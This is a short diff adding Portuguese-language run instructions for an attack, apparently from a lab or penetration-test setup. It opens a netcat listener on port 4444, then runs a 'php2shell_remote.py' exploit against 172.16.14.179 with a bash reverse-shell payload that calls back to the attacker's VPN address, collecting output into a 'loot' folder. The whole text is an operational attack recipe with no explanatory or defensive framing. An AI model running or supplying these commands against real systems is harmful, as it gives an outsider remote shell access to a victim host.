@@ -1,0 +1,17 @@
+Terminal 1 — abra o listener:
+
+nc -lvnp 4444
+
+Terminal 2 — execute o exploit:
+
+cd /home/kali/codex/PHP2SHELL-172.16.14.179
+
+PHP2SHELL_HOST=172.16.14.179 python3 exploits/php2shell_remote.py \
+  --port 80 \
+  --arch x86_64 \
+  --workers 150 \
+  --retries 1 \
+  --timeout 180 \
+  --cmd 'bash -c "bash -i >& /dev/tcp/seuipvpn/4444 0>&1"' \
+  --outdir loot \
+  --proof loot/proof.txt
